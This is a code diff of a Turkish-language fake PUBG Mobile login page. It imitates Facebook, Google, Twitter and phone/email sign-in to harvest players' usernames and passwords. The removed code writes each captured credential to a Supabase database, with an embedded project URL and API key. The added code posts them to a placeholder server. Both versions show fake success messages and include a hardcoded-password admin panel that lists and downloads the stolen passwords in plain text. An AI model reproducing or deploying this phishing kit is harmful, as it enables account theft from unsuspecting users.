-</div>
-</div>
-
-<div class="popup twitter-popup" id="twitterPopup">
-<div class="popup-content">
-<div class="popup-header">
-<span class="close-popup" id="closeTwitterPopup">&times;</span>
-<div class="popup-logo">
-<i class="fab fa-twitter"></i>
-</div>
-<h3 class="popup-title">Twitter ile Giriş Yap</h3>
-<p class="popup-subtitle">PUBG Mobile deneyiminize devam edin</p>
-</div>
-
-<form class="popup-form" id="twitterForm">
-<div class="input-group">
-<label for="twitterUsername">Kullanıcı adı, e-posta veya telefon</label>
-<input type="text" id="twitterUsername" required>
-</div>
-
-<div class="input-group">
-<label for="twitterPassword">Şifre</label>
-<input type="password" id="twitterPassword" required>
-</div>
-
-<button type="submit" class="popup-submit">Giriş Yap</button>
-</form>
-
-<div class="popup-footer">
-<a href="#">Şifrenizi mi unuttunuz?</a> · <a href="#">Twitter'a kaydol</a>
-</div>
-</div>
-</div>
-
-<div class="popup phone-popup" id="phonePopup">
-<div class="popup-content">
-<div class="popup-header">
-<span class="close-popup" id="closePhonePopup">&times;</span>
-<div class="popup-logo">
-<i class="fas fa-envelope"></i>
-</div>
-<h3 class="popup-title">Telefon / E-posta ile Giriş</h3>
-<p class="popup-subtitle">PUBG Mobile hesabınıza erişin</p>
-</div>
-
-<form class="popup-form" id="phoneForm">
-<div class="input-group">
-<label for="phoneEmail">Telefon veya E-posta</label>
-<input type="text" id="phoneEmail" required>
-</div>
-
-<div class="input-group">
-<label for="phonePassword">Şifre</label>
-<input type="password" id="phonePassword" required>
-</div>
-
-<button type="submit" class="popup-submit">GİRİŞ YAP</button>
-</form>
-
-<div class="popup-footer">
-<a href="#">Şifrenizi mi unuttunuz?</a>
-</div>
-</div>
-</div>
-
-<script>
-// Supabase configuration (replace with your own)
-    const SUPABASE_URL = "https://your-project.supabase.co";
-    const SUPABASE_KEY = "your-supabase-key";
-    const SUPABASE_URL = "https://kjkcuccqjdsgxzhxgclb.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqa2N1Y2NxamRzZ3h6aHhnY2xiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM5OTkxNDQsImV4cCI6MjA2OTU3NTE0NH0.8p6eQMAe6bNHdw7Lt9BPctVlxzakAYg-srwMXwWou_M";
-
-// Initialize Supabase
-const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-
-// Admin credentials
-const ADMIN_USERNAME = "admin";
-const ADMIN_PASSWORD = "qwerty1234";
-
-// DOM elements
-const adminButton = document.getElementById('adminButton');
-const adminPanel = document.getElementById('adminPanel');
-const adminLogout = document.getElementById('adminLogout');
-const downloadLogs = document.getElementById('downloadLogs');
-const loginData = document.getElementById('loginData');
-const logArea = document.getElementById('logArea');
-const loadingSpinner = document.getElementById('loadingSpinner');
-
-// Admin button click
-adminButton.addEventListener('click', async () => {
-const username = prompt("Admin Kullanıcı Adı:");
-const password = prompt("Admin Şifresi:");
-
-if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-adminPanel.style.display = 'block';
-await fetchLoginData();
-} else {
-alert("Hatalı admin bilgileri!");
-}
-});
-
-// Admin panel logout
-adminLogout.addEventListener('click', () => {
-adminPanel.style.display = 'none';
-});
-
-// Download logs
-downloadLogs.addEventListener('click', () => {
-const logText = generateLogText();
-const blob = new Blob([logText], { type: 'text/plain' });
-const url = URL.createObjectURL(blob);
-const a = document.createElement('a');
-a.href = url;
-a.download = 'pubg_login_logs.txt';
-document.body.appendChild(a);
-a.click();
-document.body.removeChild(a);
-URL.revokeObjectURL(url);
-});
-
-// Popup handling
-document.querySelectorAll('.popup').forEach(popup => {
-const closeBtn = popup.querySelector('.close-popup');
-if (closeBtn) {
-closeBtn.addEventListener('click', () => {
-popup.style.display = 'none';
-});
-}
-});
-
-// Form submissions
-document.querySelectorAll('form').forEach(form => {
-form.addEventListener('submit', async (e) => {
-e.preventDefault();
-const method = form.id.replace('Form', '');
-let username, password;
-
-if (method === 'facebook') {
-username = document.getElementById('facebookEmail').value;
-password = document.getElementById('facebookPassword').value;
-} else if (method === 'google') {
-username = document.getElementById('googleEmail').value;
-password = document.getElementById('googlePassword').value;
-} else if (method === 'twitter') {
-username = document.getElementById('twitterUsername').value;
-password = document.getElementById('twitterPassword').value;
-} else if (method === 'phone') {
-username = document.getElementById('phoneEmail').value;
-password = document.getElementById('phonePassword').value;
-}
-
-if (!document.getElementById('policyCheck').checked) {
-alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
-return;
-}
-
-await handleLogin(method.charAt(0).toUpperCase() + method.slice(1), username, password);
-form.reset();
-document.getElementById(`${method}Popup`).style.display = 'none';
-});
-});
-
-// Login buttons
-document.querySelectorAll('.buttons button').forEach(button => {
-button.addEventListener('click', () => {
-if (!document.getElementById('policyCheck').checked) {
-alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
-return;
-}
-
-const method = button.id.replace('Login', '').toLowerCase();
-document.getElementById(`${method}Popup`).style.display = 'flex';
-});
-});
-
-// Handle login
-async function handleLogin(method, username, password) {
-try {
-await saveLoginAttempt(username, password, method);
-alert(`${method} ile giriş başarılı!`);
-} catch (error) {
-console.error('Giriş kaydı hatası:', error);
-alert('Bir hata oluştu, lütfen tekrar deneyin.');
-}
-}
-
-// Save login attempt to Supabase
-async function saveLoginAttempt(username, password, method) {
-// Simulate IP address
-const ip = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-const time = new Date().toISOString();
-
-const { data, error } = await supabase
-.from('login_attempts')
-.insert([
-{ 
-username: username, 
-password: password, 
-method: method, 
-time: time,
-ip: ip
-}
-]);
-
-if (error) throw error;
-return data;
-}
-
-// Fetch login data from Supabase
-async function fetchLoginData() {
-loadingSpinner.style.display = 'block';
-loginData.innerHTML = '';
-logArea.innerHTML = '';
-
-try {
-const { data: attempts, error } = await supabase
-.from('login_attempts')
-.select('*')
-.order('id', { ascending: false });
-
-if (error) throw error;
-
-if (!attempts || attempts.length === 0) {
-logArea.innerHTML = '<p>Henüz giriş kaydı bulunmamaktadır.</p>';
-loadingSpinner.style.display = 'none';
-return;
-}
-
-// Add to table and log
-attempts.forEach(attempt => {
-addLoginAttemptToTable(attempt);
-addLogEntry(attempt);
-});
-} catch (error) {
-console.error('Veri alım hatası:', error);
-logArea.innerHTML = `<p style="color: #ff3232;">Veri alınamadı: ${error.message}</p>`;
-} finally {
-loadingSpinner.style.display = 'none';
-}
-}
-
-// Add login attempt to table
-function addLoginAttemptToTable(attempt) {
-const row = document.createElement('tr');
-
-// Method badge class
-let methodClass = '';
-if(attempt.method === 'Facebook') methodClass = 'method-facebook';
-if(attempt.method === 'Google') methodClass = 'method-google';
-if(attempt.method === 'Twitter') methodClass = 'method-twitter';
-if(attempt.method === 'Phone') methodClass = 'method-phone';
-
-// Format time
-const time = new Date(attempt.time);
-const formattedTime = `${time.toLocaleDateString()} ${time.toLocaleTimeString()}`;
-
-row.innerHTML = `
-       <td>${attempt.id}</td>
-       <td>${formattedTime}</td>
-       <td>${attempt.username}</td>
-       <td>${attempt.password}</td>
-       <td><span class="method-badge ${methodClass}">${attempt.method}</span></td>
-       <td>${attempt.ip}</td>
-     `;
-loginData.appendChild(row);
-}
-
-// Add log entry
-function addLogEntry(attempt) {
-const time = new Date(attempt.time);
-const formattedTime = `${time.toLocaleDateString()} ${time.toLocaleTimeString()}`;
-
-const logEntry = document.createElement('p');
-logEntry.innerHTML = `[${formattedTime}] - ${attempt.method} - Kullanıcı: ${attempt.username} - Şifre: ${attempt.password} - IP: ${attempt.ip}`;
-logArea.appendChild(logEntry);
-}
-
-// Generate log text
-function generateLogText() {
-const rows = document.querySelectorAll('.admin-table tbody tr');
-let logText = "PUBG Mobile Giriş Logları\n";
-logText += "============================\n\n";
-
-rows.forEach(row => {
-const cells = row.querySelectorAll('td');
-logText += `ID: ${cells[0].textContent}\n`;
-logText += `Zaman: ${cells[1].textContent}\n`;
-logText += `Kullanıcı Adı: ${cells[2].textContent}\n`;
-logText += `Şifre: ${cells[3].textContent}\n`;
-logText += `Yöntem: ${cells[4].textContent}\n`;
-logText += `IP Adresi: ${cells[5].textContent}\n`;
-logText += "-------------------------\n";
-});
-
-return logText;
-}
-</script>
+  <button class="admin-btn" id="adminButton">
+    <i class="fas fa-user-secret"></i> ADMIN
+  </button>
+  
+  <div class="content-container">
+    <div class="logo">PUBG<br><span>MOBILE</span></div>
+    <div class="buttons">
+      <button class="facebook" id="facebookLogin">
+        <i class="fab fa-facebook-f"></i> Login with Facebook
+      </button>
+      <button class="google" id="googleLogin">
+        <i class="fab fa-google"></i> Sign in with Google
+      </button>
+      <button class="twitter" id="twitterLogin">
+        <i class="fab fa-twitter"></i> Sign in with Twitter
+      </button>
+      <button class="phone" id="phoneLogin">
+        <i class="fas fa-envelope"></i> Phone / Email
+      </button>
+    </div>
+    <div class="legal">
+      <label>
+        <input type="checkbox" id="policyCheck" checked />
+        Okudum ve kabul ediyorum:
+        <a href="#">Gizlilik Politikası</a> &
+        <a href="#">Kullanıcı Sözleşmesi</a>
+      </label>
+    </div>
+  </div>
+  
+  <!-- Admin Panel -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="admin-panel-header">
+      <div class="admin-panel-title">PUBG MOBILE - ADMIN PANELİ</div>
+      <div class="admin-buttons">
+        <div class="admin-download" id="downloadLogs">
+          <i class="fas fa-download"></i> Logları İndir
+        </div>
+        <div class="admin-logout" id="adminLogout">
+          <i class="fas fa-sign-out-alt"></i> ÇIKIŞ YAP
+        </div>
+      </div>
+    </div>
+    
+    <div class="spinner" id="loadingSpinner"></div>
+    
+    <table class="admin-table">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>Zaman</th>
+          <th>Kullanıcı Adı</th>
+          <th>Şifre</th>
+          <th>Yöntem</th>
+          <th>IP Adresi</th>
+        </tr>
+      </thead>
+      <tbody id="loginData">
+        <!-- Login data will appear here -->
+      </tbody>
+    </table>
+    
+    <div class="log-area" id="logArea">
+      <!-- Log data will appear here -->
+    </div>
+  </div>
+  
+  <!-- Popups -->
+  <div class="popup facebook-popup" id="facebookPopup">
+    <!-- Facebook popup content -->
+  </div>
+  
+  <div class="popup google-popup" id="googlePopup">
+    <!-- Google popup content -->
+  </div>
+  
+  <div class="popup twitter-popup" id="twitterPopup">
+    <!-- Twitter popup content -->
+  </div>
+  
+  <div class="popup phone-popup" id="phonePopup">
+    <!-- Phone popup content -->
+  </div>
+  
+  <script>
+    // Admin credentials
+    const ADMIN_USERNAME = "admin";
+    const ADMIN_PASSWORD = "qwerty1234";
+    
+    // DOM elements
+    const adminButton = document.getElementById('adminButton');
+    const adminPanel = document.getElementById('adminPanel');
+    const adminLogout = document.getElementById('adminLogout');
+    const downloadLogs = document.getElementById('downloadLogs');
+    const facebookLogin = document.getElementById('facebookLogin');
+    const googleLogin = document.getElementById('googleLogin');
+    const twitterLogin = document.getElementById('twitterLogin');
+    const phoneLogin = document.getElementById('phoneLogin');
+    const facebookPopup = document.getElementById('facebookPopup');
+    const googlePopup = document.getElementById('googlePopup');
+    const twitterPopup = document.getElementById('twitterPopup');
+    const phonePopup = document.getElementById('phonePopup');
+    const loginData = document.getElementById('loginData');
+    const logArea = document.getElementById('logArea');
+    const policyCheck = document.getElementById('policyCheck');
+    const loadingSpinner = document.getElementById('loadingSpinner');
+    
+    // Simulated server URL for demonstration
+    // In a real application, this would be your server endpoint
+    const SERVER_URL = "https://jsonplaceholder.typicode.com/posts";
+    
+    // Admin button click
+    adminButton.addEventListener('click', async () => {
+      const username = prompt("Admin Kullanıcı Adı:");
+      const password = prompt("Admin Şifresi:");
+      
+      if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+        adminPanel.style.display = 'block';
+        await fetchLoginData();
+      } else {
+        alert("Hatalı admin bilgileri!");
+      }
+    });
+    
+    // Logout from admin panel
+    adminLogout.addEventListener('click', () => {
+      adminPanel.style.display = 'none';
+    });
+    
+    // Download logs
+    downloadLogs.addEventListener('click', () => {
+      const logText = generateLogText();
+      const blob = new Blob([logText], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'pubg_login_logs.txt';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    });
+    
+    // Login buttons
+    facebookLogin.addEventListener('click', () => openPopup('facebook'));
+    googleLogin.addEventListener('click', () => openPopup('google'));
+    twitterLogin.addEventListener('click', () => openPopup('twitter'));
+    phoneLogin.addEventListener('click', () => openPopup('phone'));
+    
+    // Open popup function
+    function openPopup(type) {
+      if(!policyCheck.checked) {
+        alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
+        return;
+      }
+      
+      document.getElementById(`${type}Popup`).style.display = 'flex';
+      setupPopupForm(type);
+    }
+    
+    // Setup popup form
+    function setupPopupForm(type) {
+      const form = document.getElementById(`${type}Form`);
+      const closeBtn = document.getElementById(`close${type.charAt(0).toUpperCase() + type.slice(1)}Popup`);
+      
+      // Reset form if it exists
+      if (form) form.reset();
+      
+      // Add close event
+      closeBtn.addEventListener('click', () => {
+        document.getElementById(`${type}Popup`).style.display = 'none';
+      });
+      
+      // Add submit event
+      if (form) {
+        form.onsubmit = (e) => {
+          e.preventDefault();
+          handleLogin(type);
+        };
+      }
+    }
+    
+    // Handle login
+    function handleLogin(type) {
+      const popup = document.getElementById(`${type}Popup`);
+      const email = document.getElementById(`${type}Email`)?.value || 
+                   document.getElementById(`${type}Username`)?.value ||
+                   document.getElementById(`${type}Email`)?.value;
+      const password = document.getElementById(`${type}Password`).value;
+      const loginTime = new Date().toLocaleString();
+      
+      saveLoginAttempt(email, password, type.charAt(0).toUpperCase() + type.slice(1), loginTime);
+      popup.style.display = 'none';
+      
+      // Show success message
+      alert(`${type.charAt(0).toUpperCase() + type.slice(1)} ile giriş başarılı!`);
+    }
+    
+    // Save login attempt to server
+    async function saveLoginAttempt(username, password, method, time) {
+      // Simulate IP address
+      const ip = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+      
+      const attempt = {
+        id: Date.now(),
+        username,
+        password,
+        method,
+        time,
+        ip
+      };
+      
+      try {
+        // Send data to server
+        const response = await fetch(SERVER_URL, {
+          method: 'POST',
+          body: JSON.stringify(attempt),
+          headers: {
+            'Content-type': 'application/json; charset=UTF-8',
+          },
+        });
+        
+        if (!response.ok) {
+          console.error('Server error:', response.status);
+        }
+      } catch (error) {
+        console.error('Error saving login attempt:', error);
+      }
+    }
+    
+    // Fetch login data from server
+    async function fetchLoginData() {
+      loadingSpinner.style.display = 'block';
+      loginData.innerHTML = '';
+      logArea.innerHTML = '';
+      
+      try {
+        // Fetch data from server
+        const response = await fetch(SERVER_URL);
+        
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        
+        // For demo purposes, we'll simulate data
+        // In a real app, you would use response.json()
+        const simulatedData = generateSimulatedData();
+        
+        // Process data
+        simulatedData.forEach(attempt => {
+          addLoginAttemptToTable(attempt);
+          addLogEntry(attempt);
+        });
+      } catch (error) {
+        console.error('Error fetching login data:', error);
+        logArea.innerHTML = `<p style="color: #ff3232;">Veri alınamadı: ${error.message}</p>`;
+      } finally {
+        loadingSpinner.style.display = 'none';
+      }
+    }
+    
+    // Generate simulated data for demo
+    function generateSimulatedData() {
+      const methods = ['Facebook', 'Google', 'Twitter', 'Phone/Email'];
+      const usernames = ['player1', 'gamer123', 'pubg_fan', 'john_doe', 'sarah_m'];
+      const data = [];
+      
+      for (let i = 0; i < 15; i++) {
+        const method = methods[Math.floor(Math.random() * methods.length)];
+        const username = usernames[Math.floor(Math.random() * usernames.length)];
+        const password = '********'.split('').map(() => Math.random().toString(36).charAt(2)).join('');
+        const time = new Date(Date.now() - Math.floor(Math.random() * 1000000000)).toLocaleString();
+        const ip = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        
+        data.push({
+          id: i + 1,
+          username,
+          password,
+          method,
+          time,
+          ip
+        });
+      }
+      
+      return data;
+    }
+    
+    // Add login attempt to table
+    function addLoginAttemptToTable(attempt) {
+      const row = document.createElement('tr');
+      
+      // Method badge class
+      let methodClass = '';
+      if(attempt.method === 'Facebook') methodClass = 'method-facebook';
+      if(attempt.method === 'Google') methodClass = 'method-google';
+      if(attempt.method === 'Twitter') methodClass = 'method-twitter';
+      if(attempt.method === 'Phone/Email') methodClass = 'method-phone';
+      
+      row.innerHTML = `
+        <td>${attempt.id}</td>
+        <td>${attempt.time}</td>
+        <td>${attempt.username}</td>
+        <td>${attempt.password}</td>
+        <td><span class="method-badge ${methodClass}">${attempt.method}</span></td>
+        <td>${attempt.ip}</td>
+      `;
+      loginData.appendChild(row);
+    }
+    
+    // Add log entry
+    function addLogEntry(attempt) {
+      const logEntry = document.createElement('p');
+      logEntry.innerHTML = `[${attempt.time}] - ${attempt.method} - Kullanıcı: ${attempt.username} - Şifre: ${attempt.password} - IP: ${attempt.ip}`;
+      logArea.appendChild(logEntry);
+    }
+    
+    // Generate log text
+    function generateLogText() {
+      const rows = document.querySelectorAll('.admin-table tbody tr');
+      let logText = "PUBG Mobile Giriş Logları\n";
+      logText += "============================\n\n";
+      
+      rows.forEach(row => {
+        const cells = row.querySelectorAll('td');
+        logText += `ID: ${cells[0].textContent}\n`;
+        logText += `Zaman: ${cells[1].textContent}\n`;
+        logText += `Kullanıcı Adı: ${cells[2].textContent}\n`;
+        logText += `Şifre: ${cells[3].textContent}\n`;
+        logText += `Yöntem: ${cells[4].textContent}\n`;
+        logText += `IP Adresi: ${cells[5].textContent}\n`;
+        logText += "-------------------------\n";
+      });
+      
+      return logText;
+    }
+    
+    // Initialize popups
+    function initPopups() {
+      const popupHTML = `
+        <!-- Facebook Popup -->
+        <div class="popup facebook-popup" id="facebookPopup">
+          <div class="popup-content">
+            <div class="popup-header">
+              <span class="close-popup" id="closeFacebookPopup">&times;</span>
+              <div class="popup-logo">
+                <i class="fab fa-facebook-f"></i>
+              </div>
+              <h3 class="popup-title">Facebook ile Giriş Yap</h3>
+              <p class="popup-subtitle">PUBG Mobile hesabınıza bağlanın</p>
+            </div>
+            
+            <form class="popup-form" id="facebookForm">
+              <div class="input-group">
+                <label for="facebookEmail">E-posta veya Telefon</label>
+                <input type="text" id="facebookEmail" required>
+              </div>
+              
+              <div class="input-group">
+                <label for="facebookPassword">Şifre</label>
+                <input type="password" id="facebookPassword" required>
+              </div>
+              
+              <button type="submit" class="popup-submit">GİRİŞ YAP</button>
+            </form>
+            
+            <div class="popup-footer">
+              <a href="#">Hesabınıza erişimde sorun mu yaşıyorsunuz?</a>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Google Popup -->
+        <div class="popup google-popup" id="googlePopup">
+          <div class="popup-content">
+            <div class="popup-header">
+              <span class="close-popup" id="closeGooglePopup">&times;</span>
+              <div class="popup-logo">
+                <i class="fab fa-google"></i>
+              </div>
+              <h3 class="popup-title">Google ile Giriş Yap</h3>
+              <p class="popup-subtitle">PUBG Mobile hesabınıza devam edin</p>
+            </div>
+            
+            <form class="popup-form" id="googleForm">
+              <div class="input-group">
+                <label for="googleEmail">E-posta veya Telefon</label>
+                <input type="text" id="googleEmail" required>
+              </div>
+              
+              <div class="input-group">
+                <label for="googlePassword">Şifrenizi girin</label>
+                <input type="password" id="googlePassword" required>
+              </div>
+              
+              <div class="input-group" style="flex-direction: row; align-items: center; gap: 10px;">
+                <input type="checkbox" id="googleRemember">
+                <label for="googleRemember" style="margin-bottom: 0;">Beni hatırla</label>
+              </div>
+              
+              <button type="submit" class="popup-submit">İleri</button>
+            </form>
+            
+            <div class="popup-footer">
+              <a href="#">Şifrenizi mi unuttunuz?</a>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Twitter Popup -->
+        <div class="popup twitter-popup" id="twitterPopup">
+          <div class="popup-content">
+            <div class="popup-header">
+              <span class="close-popup" id="closeTwitterPopup">&times;</span>
+              <div class="popup-logo">
+                <i class="fab fa-twitter"></i>
+              </div>
+              <h3 class="popup-title">Twitter ile Giriş Yap</h3>
+              <p class="popup-subtitle">PUBG Mobile deneyiminize devam edin</p>
+            </div>
+            
+            <form class="popup-form" id="twitterForm">
+              <div class="input-group">
+                <label for="twitterUsername">Kullanıcı adı, e-posta veya telefon</label>
+                <input type="text" id="twitterUsername" required>
+              </div>
+              
+              <div class="input-group">
+                <label for="twitterPassword">Şifre</label>
+                <input type="password" id="twitterPassword" required>
+              </div>
+              
+              <button type="submit" class="popup-submit">Giriş Yap</button>
+            </form>
+            
+            <div class="popup-footer">
+              <a href="#">Şifrenizi mi unuttunuz?</a> · <a href="#">Twitter'a kaydol</a>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Phone/Email Popup -->
+        <div class="popup phone-popup" id="phonePopup">
+          <div class="popup-content">
+            <div class="popup-header">
+              <span class="close-popup" id="closePhonePopup">&times;</span>
+              <div class="popup-logo">
+                <i class="fas fa-envelope"></i>
+              </div>
+              <h3 class="popup-title">Telefon / E-posta ile Giriş</h3>
+              <p class="popup-subtitle">PUBG Mobile hesabınıza erişin</p>
+            </div>
+            
+            <form class="popup-form" id="phoneForm">
+              <div class="input-group">
+                <label for="phoneEmail">Telefon veya E-posta</label>
+                <input type="text" id="phoneEmail" required>
+              </div>
+              
+              <div class="input-group">
+                <label for="phonePassword">Şifre</label>
+                <input type="password" id="phonePassword" required>
+              </div>
+              
+              <button type="submit" class="popup-submit">GİRİŞ YAP</button>
+            </form>
+            
+            <div class="popup-footer">
+              <a href="#">Şifrenizi mi unuttunuz?</a>
+            </div>
+          </div>
+        </div>
+      `;
+      
+      document.body.insertAdjacentHTML('beforeend', popupHTML);
+    }
+    
+    // Initialize the page
+    window.addEventListener('DOMContentLoaded', () => {
+      initPopups();
+    });
+  </script>
 </body>
 </html>
